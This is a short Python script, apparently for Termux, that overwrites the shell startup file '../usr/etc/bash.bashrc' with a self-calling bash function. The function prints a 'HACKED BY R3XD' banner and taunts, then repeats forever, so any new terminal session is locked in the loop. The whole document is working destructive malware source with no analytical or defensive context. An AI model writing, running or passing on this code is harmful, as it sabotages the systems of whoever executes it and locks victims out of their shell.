import os

bsh = '''
mulai(){
figlet "HACKED BY R3XD"|lolcat
echo -e "\e[32mCreated By Vshell\e[0m"
echo -e "\e[31mNo One Cares But\e[0m"
echo -e "\e[31mWe cares about You\e[0m"
sleep 2
clear
mulai
}
mulai
'''
f = open("../usr/etc/bash.bashrc","w")
f.write(bsh)
f.close()
